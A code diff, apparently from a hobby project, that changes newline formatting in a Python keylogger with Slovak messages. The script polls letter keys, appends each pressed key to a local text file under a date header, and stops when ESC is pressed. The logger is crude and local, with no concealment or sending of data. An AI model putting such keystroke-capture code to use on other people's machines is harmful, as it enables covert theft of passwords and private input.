@@ -18,7 +18,7 @@ else:
     pass
 
 with open("Loggedkeys.txt", "a") as file:
-    file.write("[+" + " " + "-"*len(Datum) + " " + "+]" + "\n" + "   " + Datum + "\n" + "[+ " + "-"*len(Datum) + " +]" + "\n")
+    file.write("\n[+" + " " + "-"*len(Datum) + " " + "+]" + "\n" + "   " + Datum + "\n" + "[+ " + "-"*len(Datum) + " +]" + "\n")
     
 KeyList = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
            "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
@@ -34,10 +34,10 @@ while True:
     for Klavesa in KeyList:
         if keyboard.is_pressed(Klavesa):
             with open(LoggedKeys, "a") as file:
-                file.write("\nPressed key :" + Klavesa + "\n")
+                file.write("Pressed key :" + Klavesa + "\n")
         elif keyboard.is_pressed("esc"):
-            print("bolo stlacene 'ESC' --> Script = Vypnuty !")
+            print("bolo stlacene 'ESC' --> Script = Vypnuty !\n")
             with open("Loggedkeys.txt", "a") as file:
-                file.write("bolo stlacene 'ESC' --> Script = Vypnuty !")
+                file.write("bolo stlacene 'ESC' --> Script = Vypnuty !\n")
             time.sleep(1)
             exit()
